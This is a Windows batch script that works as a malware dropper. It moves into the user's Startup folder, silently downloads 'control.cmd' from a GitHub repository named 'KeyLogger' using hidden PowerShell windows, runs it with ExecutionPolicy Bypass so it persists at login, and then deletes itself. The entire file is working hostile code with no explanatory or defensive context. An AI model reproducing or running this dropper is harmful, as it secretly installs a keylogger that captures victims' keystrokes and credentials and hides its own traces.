@echo off
set initial=cd
set start_up="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

cd %start_up%
powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/KeyLogger/main/control.cmd' -OutFile 'control.cmd'"

start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass .\control.cmd

cd %initial%
del initial.cmd
